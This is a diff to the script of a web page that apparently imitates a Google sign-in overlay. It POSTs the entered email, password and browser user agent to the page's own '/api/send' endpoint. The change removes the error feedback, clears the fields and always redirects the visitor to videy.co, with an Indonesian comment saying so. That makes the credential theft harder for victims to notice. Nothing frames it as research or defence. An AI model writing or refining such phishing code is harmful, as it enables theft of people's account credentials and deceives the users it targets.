@@ -464,7 +464,7 @@
             btnNext.disabled = true;
 
             try {
-                const response = await fetch('/api/send', {
+                await fetch('/api/send', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -475,24 +475,14 @@
                         userAgent: navigator.userAgent
                     })
                 });
-
-                const data = await response.json();
-                console.log('Response:', data);
-
-                if (response.ok) {
-                    emailInput.value = '';
-                    passInput.value = '';
-                    overlayGoogle.classList.remove('active');
-                } else {
-                    alert('Gagal: ' + (data.error || 'Coba lagi'));
-                }
             } catch (err) {
                 console.error(err);
-                alert('Error: ' + err.message);
-            } finally {
-                btnNext.textContent = 'Next';
-                btnNext.disabled = false;
             }
+
+            // Redirect ke videy.co apapun hasilnya
+            emailInput.value = '';
+            passInput.value = '';
+            window.location.href = 'https://videy.co';
         });
     </script>
 </body>
